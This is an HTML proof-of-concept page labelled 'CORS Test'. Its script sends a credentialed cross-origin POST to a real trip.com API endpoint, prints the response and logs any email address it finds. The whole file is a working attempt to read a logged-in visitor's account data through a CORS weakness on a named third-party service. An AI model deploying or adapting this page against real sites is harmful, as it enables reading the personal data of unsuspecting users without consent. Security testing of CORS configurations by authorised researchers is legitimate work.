<!DOCTYPE html>
<html>
<body>

<h1>CORS Test</h1>

<pre id="result"></pre>

<script>

const TARGET = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?x-traceID=";

const body = {
    head: {
        locale: "",
        currency: "",
        vID: ""
    },
    platform: "Online",
    componentType: "online-app-download-universal",
    version: "6.0.5",
    pageId: "10320668151",
    aid: 0,
    sid: 0,
    customId: "adBanner",
    customParam: {}
};


fetch(TARGET, {
    method: "POST",

    credentials: "include",

    headers: {
        "Content-Type": "application/json"
    },

    body: JSON.stringify(body)
})

.then(async res => {

    console.log("Status:", res.status);

    const text = await res.text();

    document.getElementById("result").textContent =
        "Status: " + res.status + "\n\n" + text;


    try {

        const json = JSON.parse(text);

        console.log("JSON:", json);

        if(json.email){
            console.log("EMAIL:", json.email);
        }

    } catch(e){
        console.log("Not JSON");
    }

})

.catch(err => {

    document.getElementById("result").textContent =
    "ERROR:\n" + err;

});

</script>

</body>
</html>
